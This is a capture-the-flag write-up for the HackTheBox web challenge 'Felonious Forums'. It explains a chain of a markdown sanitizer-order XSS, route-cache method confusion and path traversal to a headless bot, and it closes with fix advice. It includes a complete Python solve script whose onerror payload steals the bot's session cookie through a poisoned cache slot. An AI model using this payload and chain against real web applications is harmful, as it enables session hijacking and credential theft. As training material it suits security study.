---
layout: post
title: "Felonious Forums"
date: 2027-08-07 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, markdown, showdown, route-cache, cache-poisoning, sanitizer-bypass, bot, jwt, CWE-116, CWE-349]
---

## Overview

Felonious Forums is a retired Easy HTB Web challenge built on a Node.js/Express forum app with a Showdown markdown renderer. The flag lives inside the moderator bot's JWT. Three independent bugs chain together: a wrong sanitization order that turns DOMPurify into a no-op, a route-cache key that ignores HTTP method, and an unsanitized `post_id` that lets path traversal redirect the bot to any internal URL.

---

## The Technique

### Bug 1 — Wrong Sanitization Order ([CWE-116](https://cwe.mitre.org/data/definitions/116.html))

The preview endpoint processes markdown with DOMPurify first, then Showdown:

```javascript
// VULNERABLE — sanitize runs on raw markdown text, not on HTML
const safeContent = makeHTML(filterInput(content));
```

DOMPurify applied to raw markdown text is a **no-op** — the text contains no HTML to purify. Showdown then converts it to HTML, generating XSS attributes untouched. The correct order is `filterInput(makeHTML(content))`.

Showdown's image syntax places the URL verbatim into `src="..."`:

```
![x](http://x"onerror="JS)
```

Showdown produces:

```html
<img src="http://x"onerror="JS" alt="x">
```

The `"` in the URL string closes the `src` attribute and opens `onerror`. Two constraints apply:

- Showdown's URL regex supports **one level of nested `()`** — the JS inside `onerror` must contain no extra parentheses. `fetch(ARGS)` with no function calls in ARGS is the right shape.
- No literal `"` is allowed inside the attribute value (it would terminate `onerror="..."`). Single-quoted JS strings or `&quot;` HTML entities work; the browser decodes entities before executing the handler.

### Bug 2 — Route-Cache HTTP Method Confusion ([CWE-349](https://cwe.mitre.org/data/definitions/349.html))

`route-cache` uses this key function:

```javascript
const cacheKey = (req, res) => `_${req.headers.host}_${req.url}_${req.ip}`;
// HTTP method is NOT part of the key
```

Both `GET` and `POST` `/threads/preview` share the same cache namespace. A `POST` response fills the slot that the bot's `GET` will later hit — method confusion allows cache poisoning without any MITM.

### Bug 3 — Path Traversal in `/api/report`

```javascript
// No validation on post_id — passed directly to the headless browser
await page.goto(`http://127.0.0.1:1337/report/${post_id}`, ...);
```

Supplying `post_id = "../threads/preview?KEY"` makes the bot navigate to `.../report/../threads/preview?KEY`. Chrome normalises the URL to `GET /threads/preview?KEY` — a direct cache hit on the poisoned slot.

### Cache-to-Cache Exfiltration (no external listener)

The bot's JWT has no `id` field, so posting a reply via `/api/threads/reply` fails silently (`db.postThreadReply(undefined, ...)` → NOT NULL constraint). Instead, the XSS POSTs `document.cookie` as the `content` field of a **second** preview request to a separate cache key. The server renders and caches the response. We then `GET` that key — matching `Host` and `X-Forwarded-For` — to read the cached page containing the bot's JWT. Decode the base64url payload segment to extract the `flag` field.

**Key detail:** The cookie goes in `title`, not `content`. The `content` field passes through Showdown — underscores (`_`) in the base64url JWT segments are treated as italic delimiters, splitting the token across `<em>` tags so it cannot be regex-extracted. `title` is rendered verbatim by Nunjucks (autoescape only, no markdown).

---

## Solution

### Step 1 — Register and log in

```python
s.post(f"{TARGET}/api/register", json={"username": user, "password": pwd})
s.post(f"{TARGET}/api/login",    json={"username": user, "password": pwd})
session_cookie = s.cookies.get("session")
```

### Step 2 — Choose two cache keys

```python
trigger_key = rand_str(6)  # bot navigates here, XSS fires
flag_key    = rand_str(6)  # XSS POSTs cookie here; we read it back
```

### Step 3 — Build the XSS payload

```python
xss_js = (
    f"fetch('/threads/preview?{flag_key}',"
    f"{{method:'POST',"
    f"headers:{{'Content-Type':'application/x-www-form-urlencoded'}},"
    f"body:'title='+document.cookie+'&content=x&cat_id=2'}})"
)
# No literal " in xss_js (single-quote JS) — onerror attribute stays well-formed
# No nested () — only the outer fetch() pair — Showdown one-level limit satisfied
markdown_payload = f'![x](http://127.0.0.1:1337/notfound"onerror="{xss_js})'
```

### Step 4 — Poison the trigger cache slot for the bot's IP

```python
s.post(
    f"{TARGET}/threads/preview?{trigger_key}",
    data={"title": "x", "content": markdown_payload, "cat_id": "2"},
    headers={
        "Host": "127.0.0.1:1337",           # match bot's Host header
        "X-Forwarded-For": "127.0.0.1",     # match bot's req.ip (cache key component)
        "Cookie": f"session={session_cookie}",  # explicit — requests drops it on Host override
    },
    allow_redirects=False,
)
```

### Step 5 — Trigger the bot via path traversal

```python
s.post(f"{TARGET}/api/report", json={"post_id": f"../threads/preview?{trigger_key}"})
# /api/report only sends 200 after bot.visitPost() resolves — XSS has already fired
time.sleep(2)   # brief settle
```

### Step 6 — Read the flag cache slot

```python
r = s.get(
    f"{TARGET}/threads/preview?{flag_key}",
    headers={
        "Host": "127.0.0.1:1337",
        "X-Forwarded-For": "127.0.0.1",
        "Cookie": f"session={session_cookie}",  # auth required before cache is checked
    },
    allow_redirects=False,
)
```

### Step 7 — Decode the JWT and extract the flag

```python
jwt = re.search(r'(eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]+)', r.text).group(1)
payload = json.loads(base64.urlsafe_b64decode(jwt.split(".")[1] + "=="))
print(payload["flag"])   # HTB{...}
```

### Full solve script

```python
#!/usr/bin/env python3
import requests, time, base64, json, re, random, string, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

s = requests.Session()
user, pwd = rand_str(), rand_str() + "1!A"
s.post(f"{TARGET}/api/register", json={"username": user, "password": pwd})
s.post(f"{TARGET}/api/login",    json={"username": user, "password": pwd})
session_cookie = s.cookies.get("session")

trigger_key = rand_str(6)
flag_key    = rand_str(6)

xss_js = (
    f"fetch('/threads/preview?{flag_key}',"
    f"{{method:'POST',"
    f"headers:{{'Content-Type':'application/x-www-form-urlencoded'}},"
    f"body:'title='+document.cookie+'&content=x&cat_id=2'}})"
)
markdown_payload = f'![x](http://127.0.0.1:1337/notfound"onerror="{xss_js})'

s.post(
    f"{TARGET}/threads/preview?{trigger_key}",
    data={"title": "x", "content": markdown_payload, "cat_id": "2"},
    headers={
        "Host": "127.0.0.1:1337",
        "X-Forwarded-For": "127.0.0.1",
        "Cookie": f"session={session_cookie}",
    },
    allow_redirects=False,
)

s.post(f"{TARGET}/api/report", json={"post_id": f"../threads/preview?{trigger_key}"})
time.sleep(2)

r = s.get(
    f"{TARGET}/threads/preview?{flag_key}",
    headers={
        "Host": "127.0.0.1:1337",
        "X-Forwarded-For": "127.0.0.1",
        "Cookie": f"session={session_cookie}",
    },
    allow_redirects=False,
)
jwt = re.search(r'(eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]+)', r.text).group(1)
payload = json.loads(base64.urlsafe_b64decode(jwt.split(".")[1] + "=="))
print(payload["flag"])
```

---

## Why It Worked

The wrong sanitization order is the root cause. DOMPurify is well-known, so developers often assume calling it on any string is "safe" — but it only strips dangerous HTML from *HTML input*. Applied to raw markdown before conversion, it sanitizes plain text (no HTML present, nothing to strip). Showdown runs afterward and introduces the dangerous markup from attacker-controlled content. The remaining two bugs provide delivery: route-cache's method-agnostic key lets a POST fill a GET slot, and a missing `post_id` validation lets the bot navigate to any internal URL the attacker specifies.

---

## Fix / Defense

- **Sanitization order:** Always sanitize the HTML *output* of markdown renderers — `filterInput(makeHTML(content))` not `makeHTML(filterInput(content))`.
- **Cache key:** Include the HTTP method — `` `_${req.method}_${req.headers.host}_${req.url}_${req.ip}` ``.
- **Bot input validation:** Validate `post_id` as an integer (or a validated post path) before passing to the headless browser.
- **Secrets in JWT:** Never embed sensitive values in the client-readable JWT payload. If a value must travel with the JWT, encrypt the payload or use a server-side lookup keyed to an opaque claim.
